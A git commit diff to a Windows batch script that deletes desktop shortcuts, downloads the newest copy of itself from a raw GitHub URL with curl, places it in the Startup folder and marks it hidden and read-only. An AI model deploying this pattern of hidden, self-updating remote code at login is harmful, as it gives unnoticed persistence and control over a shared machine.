24a3888038c6d666fa65c43a6f2121edaf8fb60d
Kevie <65157770+thekevie@users.noreply.github.com>
2022-04-05 17:10:23 +0200

    Update desktop.bat

--- desktop.bat
+++ desktop.bat
@@ -8,12 +8,14 @@ cd /d %public%/Desktop
 del /q /f www.studi.se.url
 del /q /f Landguiden.url
 
+attrib -h -s -r "desktop.bat"
+
 cd %temp%
 curl -OL https://raw.githubusercontent.com/thekevie/school-program/main/desktop.bat
 cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 if not exist desktop.bat (
     type nul > desktop.bat
 )
-attrib +h +s +r "desktop.bat"
+attrib +h -s +r "desktop.bat"
 copy /Y "%temp%\desktop.bat" "desktop.bat"
 del /q /f %temp%\desktop.bat
